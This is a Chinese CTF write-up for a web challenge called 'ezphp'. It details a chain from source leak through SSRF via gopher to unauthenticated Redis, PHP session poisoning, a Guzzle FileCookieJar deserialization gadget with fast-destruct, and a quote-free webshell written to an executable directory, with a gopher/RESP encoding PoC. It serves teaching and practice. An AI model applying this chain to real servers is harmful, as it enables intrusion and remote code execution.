# ezphp

## 1. 题目信息

| 项目 | 内容 |
| --- | --- |
| 分类 | Web |
| 形态 | 容器题 |
| 附件 | 无（题目仅提供靶机） |
| 目标 | 容器 |

Flag：flag{动态容器已脱敏}

## 2. 题目分析

这是一道以PHP应用为入口的组合型Web题，主要涉及：

- PHP源码泄露
- SSRF
- gopher协议利用
- 内网Redis未授权访问
- PHP Session污染
- PHP反序列化
- 第三方依赖POP链
- 任意文件写与WebShell

总体利用链：

```text
源码泄露
    ↓
发现仅允许访问环回地址的 SSRF
    ↓
利用过滤遗漏，通过 gopher 访问内网 Redis
    ↓
定位 Redis 中保存的 PHP Session
    ↓
伪造包含序列化对象的 Session 数据
    ↓
请求应用，触发 session_start() 反序列化
    ↓
利用应用依赖中的文件写 POP 链
    ↓
向 Web 可访问、可执行的目录写入 WebShell
    ↓
获得命令执行并读取最终目标文件
```

### 链条各环节的作用

这条链能闭合，是因为每一环都为下一环提供了必要能力：

1. 源码泄露解决信息缺失。只有看到源码，才能确定SSRF的参数名、主机校验方式、协议黑名单、Session存储后端与依赖版本，否则后续构造只能盲猜。
2. 环回地址限制把SSRF从“任意出网”压缩成“只能打本机”，而本机恰好运行着Redis与应用本身，限制反而把攻击面集中到了内网服务。
3. 协议黑名单只覆盖`http`、`https`、`file`、`dict`等常见协议，遗漏了`gopher`，于是SSRF从“发一条HTTP请求”升级为“发送任意TCP字节流”，可以手工实现Redis的RESP协议。
4. Redis无认证意味着不需要口令即可读写键；管理命令被裁剪只影响“直接写文件、改配置”这类路径，不影响对Session键的读写。
5. 应用把PHP Session存在Redis中，外层格式由`session.serialize_handler`决定，攻击者写入的键值会被`session_start()`原样解码，其中的对象随即被反序列化。
6. 依赖中存在析构期写文件的类，对象释放时自动执行写文件，不需要业务代码显式调用，反序列化因此直接变成任意文件写。
7. 落点选择决定文件写能否升级为代码执行，路径必须同时满足可写、可HTTP访问、被PHP解析、不被路由或访问控制拦截。
8. 取得命令执行后还要区分构建期写入的固定诱饵与运行期注入的真实目标，才能拿到有效flag。

### 容易忽略的前提

- 容器启动约一分钟，Web与Redis不一定同时就绪，探测阶段需要重试，而不是一次失败就放弃。
- 题面直接问“how 2 shell”，说明读取类漏洞只是铺垫，最终必须落到命令执行。
- Session ID必须符合PHP默认字符集（字母、数字及少量符号），否则`session_start()`会丢弃该SID，恶意数据根本不会被读取。
- 文件写链的输出往往经过JSON编码，WebShell必须避开引号与反斜杠，否则落地的是语法错误而非可执行代码。

## 3. 解题过程

### 从源码泄露入手

首先检查题目提供的PHP页面、报错页面以及可能存在的源码高亮功能。

源码中可以重点关注以下内容：

1. 是否根据来源IP判断请求来自本机。
2. 是否根据User-Agent、Referer或其他请求头进入特殊分支。
3. 是否接收URL参数并由服务端发起请求。
4. 对URL的过滤是白名单还是黑名单。
5. 是否只校验主机名，而没有严格限制协议。

本题源码中存在一个服务端请求功能。它限制目标主机必须是环回地址，但对协议采用了不完整的黑名单过滤，遗漏了`gopher://`。

这意味着虽然不能直接访问任意外部主机，但可以把该功能当作一个通往本机TCP服务的入口。

实际审计可以按“入口—过滤—依赖”三段推进：

- 入口：页面存在一个用于展示自身代码的参数，或残留了编辑器备份、`~`/`.bak`/`.swp`后缀文件，用`php://filter/convert.base64-encode/resource=index`一类方式即可读出完整源码，且不会执行它。
- 过滤：处理逻辑先用`parse_url()`取出host，再与`127.0.0.1`、`localhost`比较，协议部分用`in_array()`做黑名单。黑名单是穷举式的，天然容易漏项。
- 依赖：`composer.json`与`composer.lock`暴露完整依赖树，可直接判断哪些版本存在公开反序列化链，同时能看到Session配置从环境变量读取并指向本机Redis。

另外，读取分支判断的是`REMOTE_ADDR`是否为环回地址。SSRF由服务端自己发起请求，源地址天然是`127.0.0.1`，这个条件可以被直接满足，它只能证明“本机可读”，不能证明“已经拿到最终答案”。

### 不要把内网读取结果直接当作最终答案

源码中还存在一个“仅本机请求可访问”的读取分支。通过SSRF配合伪造请求头，可以进入这个分支并取得一个看起来很像答案的字符串。

但这类结果需要继续验证，不能看到符合flag格式的内容就立即停止。

判断是否为诱饵时，可以检查：

- 内容是否为固定的提示性字符串。
- 文件位置是否更像题目内置资源，而非平台运行时注入位置。
- 题目标题是否明确暗示需要取得Shell。
- 容器中是否可能同时存在“构建时固定值”和“运行时动态值”。
- 提交平台是否接受该值。

如果题目明确要求进一步利用，那么本机读取通常只是提示下一阶段入口，而不是最终目标。

### 使用gopher将SSRF扩展为原始TCP客户端

普通的HTTP SSRF只能发送HTTP请求，而gopher可以近似发送攻击者控制的原始TCP字节流。

其基本形式为：

```text
gopher://127.0.0.1:<port>/_<percent-encoded-payload>
```

例如，要测试Redis，可以发送一条RESP或Redis Inline Protocol格式的`PING`请求。

如果返回：

```text
+PONG
```

即可确认本机运行着可访问的Redis。

后续应继续确认：

- Redis是否需要认证。
- 哪些命令可用。
- 危险管理命令是否被删除或重命名。
- 应用是否使用Redis保存缓存、锁或PHP Session。

即使`CONFIG`、`KEYS`、`SCAN`等命令被禁用，只要`GET`、`SET`等基础命令仍可用，就可能通过污染应用数据继续利用。

编码细节上还有两点容易出错：gopher的payload进入socket前只解码一次，百分号编码只能做一层，做两层会让Redis收到字面量`%2A`并直接报协议错误；RESP的定长必须严格，`*N`后要跟N个`$len`块，长度按字节而非字符计算，任何一处不符都会导致后续命令错位。

### 定位Redis中的PHP Session

访问应用的登录页或其他会启动Session的页面，记录服务器返回的Session Cookie。

通常可以获得：

```text
Set-Cookie: <session-cookie-name>=<session-id>
```

然后根据常见Redis Session键格式测试候选键，例如：

```text
PHPREDIS_SESSION:<session-id>
```

获取SID的方式是访问任意会调用`session_start()`的页面（登录页最稳妥），从响应头中挑出值形如24到64位十六进制或字母数字的Cookie，其余明显属于前端或安全模块的Cookie可以先排除。

还有一个容易忽略的点：若`session.use_strict_mode=1`，PHP会拒绝从未存在过的SID，直接写入的键不会被读取。应对办法是先正常访问一次，让应用为该SID落一次真实Session，再用恶意值覆盖同一个键；本题环境未开启严格模式，因此可以跳过这一步。

如果读取结果呈现如下结构：

```text
variable_name|s:<length>:"...";
```

则说明PHP使用的是`php` Session序列化格式。

其基本规则为：

```text
变量名|serialize(变量值)
```

例如：

```text
name|s:5:"value";
```

应用可能会对自己的Session变量进行二次加密，但这不代表PHP Session外层整体不可控。

只要攻击者能直接修改Redis中的Session值，就可以增加一个新的变量：

```text
controlled_name|<serialized-object>
```

当PHP执行`session_start()`时，会自动解析该Session，并对其中的对象执行反序列化。

### 寻找应用依赖中的POP链

下一步是确定目标应用加载了哪些Composer依赖，并寻找可用的PHP反序列化Gadget Chain。

常见检查方向包括：

- Guzzle
- Monolog
- Symfony组件
- Doctrine
- Laravel组件
- 应用自身带有魔术方法的类

本题环境中可以利用HTTP客户端依赖里的文件Cookie持久化类。该类在对象析构时，会把内存中的Cookie数据序列化并写入指定文件。

因此可以构造一个对象，使其属性指向：

- 攻击者控制的文件名
- 攻击者控制的Cookie内容
- 允许持久化Session Cookie的配置

当对象触发析构时，即可实现任意文件写。

以Guzzle的`FileCookieJar`为例，`save()`在析构阶段被调用，流程是：先清理过期Cookie，再把`cookies`数组整体`json_encode`，最后`file_put_contents`到`filename`指定路径。构造时需同时满足三点：

- `filename`指向目标PHP路径；
- `storeSessionCookies`为真，否则会话级Cookie会在保存前被过滤；
- 每个`SetCookie`的`data`补齐`Expires`、`Discard`、`Value`等键，`Value`才是真正写进文件的字符串。

由于最终是JSON，`Value`中的双引号会被转义成`\"`、反斜杠会被转义成`\\`，这正是后面WebShell必须避免引号的根本原因。

使用通用PHP Gadget工具时，应优先选择：

- 与目标依赖版本兼容的文件写链。
- 支持fast-destruct的生成方式。
- 能够生成ASCII安全序列化数据的选项。

fast-destruct很重要，因为它可以让Gadget在Session解码阶段尽快触发，减少对象被应用后续逻辑覆盖或清理的影响。

### 构造恶意Session

选择一个符合PHP Session ID字符集要求的自定义SID，然后构造对应的Redis键：

```text
PHPREDIS_SESSION:<controlled-sid>
```

Session值可以采用：

```text
pwn|<serialized-gadget>
```

这里的`pwn`是变量名，后面的序列化串是变量值，PHP解码时会按该变量名恢复对象。为了让对象在解码阶段就被释放，序列化串外层再包一层数组，并让同一个整数键出现两次：

```text
a:2:{i:7;<gadget>i:7;i:7;}
```

解析第二个`i:7`时，第一个值被覆盖并立即释放，`__destruct`在`unserialize()`内部就执行完毕，不必等到脚本结束。这一点很关键：Session解码后应用还会继续写自己的变量并回写Redis，若Gadget拖到请求末尾才析构，很可能已被清理。

Redis的`SET`请求使用RESP编码，建议再追加一个`EXPIRE`请求，为测试Session设置合理的有效期。完整报文与编码脚本见第4节。

将整段RESP数据逐字节百分号编码，再放入gopher URL中，通过SSRF发送给Redis。

### 触发Session反序列化

Redis写入成功后，用自定义SID请求一个会启动PHP Session的页面，请求示例见第4节。

服务器端的处理过程为：

```text
从 Cookie 读取 SID
    ↓
Session Handler 从 Redis 读取对应键
    ↓
session_start() 解码 Session 数据
    ↓
反序列化攻击者构造的对象
    ↓
触发 Gadget 的魔术方法或析构方法
```

触发后，可以重新读取Redis中的Session值进行验证。

如果恶意对象已经被fast-destruct消费，并且应用又在同一Session中写入了自己的正常变量，通常说明：

- 自定义SID被应用接受。
- Redis Session键名正确。
- PHP成功解码了恶意Session。
- Gadget的析构流程已经执行。

### 选择正确的文件落点

拥有任意文件写并不等于立刻拥有命令执行。目标路径必须同时满足：

1. PHP/Web用户对目录具有写权限。
2. 文件能通过HTTP访问。
3. Web服务器会把该文件交给PHP解释器处理。
4. 目录没有禁止脚本执行。
5. 请求不会被应用的路由重写成统一的404页面。

应根据目标应用的目录结构寻找：

- 应用扩展目录
- 插件目录
- 兼容性接口目录
- 公开资源目录的可执行子目录
- Web根目录下由运行用户维护的目录

本题最终选择兼容接口目录下的点文件，例如`ocs-provider/.cache.php`。它满足全部条件：目录属主是Web运行用户，可直接创建文件；该目录由Web服务器直接映射，不经过前端控制器；`.php`后缀会交给PHP-FPM解析；点文件不在路由规则内，不会被改写成统一404。

反过来，`data/`、`config/`这类目录通常自带`.htaccess`或`Require all denied`，写入成功也访问不到；上传目录往往禁止执行脚本；应用根目录的固定入口文件则可能被框架的rewrite规则拦截。因此落点要靠“先写小文件探测、再正式写入”确定，而不是凭经验押注。

测试时不要只判断“文件是否成功写入”，还要分别验证：

- 写入是否成功
- HTTP状态是否正确
- PHP是否被执行
- 输出是否被应用路由或访问控制覆盖

### 注意文件写Gadget的编码副作用

某些文件写链并不是原样写入字符串，而是先将对象内容编码为JSON、日志格式或其他结构。

如果PHP代码位于JSON字符串中，代码里的引号和反斜杠可能被转义，例如：

```text
"  →  \"
\  →  \\
```

这会导致最终落地的PHP文件出现语法错误。

因此WebShell应尽量满足：

- 不使用字符串字面量。
- 不使用单引号或双引号。
- 不使用不必要的反斜杠。
- 代码尽可能短。

一种通用思路是通过字符编码函数动态构造参数名，而不是直接写字符串：

```php
<?php system($_GET[chr(<ascii-code>)]); ?>
```

这里的ASCII值应替换为实际需要的参数字符。这样可以减少JSON转义破坏PHP语法的风险。

### 验证命令执行

WebShell写入后，先执行无副作用的验证命令，例如：

```text
id
whoami
pwd
```

确认命令执行后，再进行以下检查：

- 当前运行用户及其权限。
- Web根目录和应用目录结构。
- 环境变量。
- 容器初始化脚本。
- 运行时挂载点。
- 可能由平台动态注入的目标文件。

本题的定位过程可以概括为：先用`id`、`pwd`确认权限与工作目录，再用`ls -la /`和`cat /proc/1/cmdline`找到启动脚本，从脚本中看出真实flag是运行期写入某个路径或由环境变量生成；随后用`env`以及按修改时间筛选的方式，找出修改时间接近容器启动时间的文件，读取后得到`flag{...}`。

与之相对，源码中那个“本机可读”的固定资源是构建期就存在的提示，格式再像flag也不应作为提交值。区分标准只有一条：它是否由运行时初始化流程产生，是否与容器启动时间、环境变量或挂载点相关联。

如果存在多个看起来像答案的文件，应结合以下信息判断真实目标：

- 初始化脚本如何写入动态值。
- 文件修改时间与容器启动时间是否一致。
- 文件是否由平台环境变量生成。
- 题目源码读取的是固定资源还是运行时资源。
- 提交平台是否接受候选值。

## 4. PoC

```text
*3\r\n
$3\r\n
SET\r\n
$<key-length>\r\n
<session-key>\r\n
$<value-length>\r\n
<session-value>\r\n
```
```text
*3\r\n
$6\r\n
EXPIRE\r\n
$<key-length>\r\n
<session-key>\r\n
$<ttl-length>\r\n
<ttl>\r\n
```
```python
def redis_bulk(data: bytes) -> bytes:
    return b'$%d\r\n' % len(data) + data + b'\r\n'

session_key = b'PHPREDIS_SESSION:' + controlled_sid
session_value = b'pwn|' + serialized_gadget

resp = (
    b'*3\r\n'
    + redis_bulk(b'SET')
    + redis_bulk(session_key)
    + redis_bulk(session_value)
)

encoded = ''.join(f'%{byte:02x}' for byte in resp)
gopher_url = 'gopher://127.0.0.1:<redis-port>/_' + encoded
```
```http
GET /<session-enabled-endpoint> HTTP/1.1
Host: target
Cookie: <session-cookie-name>=<controlled-sid>
Connection: close
```
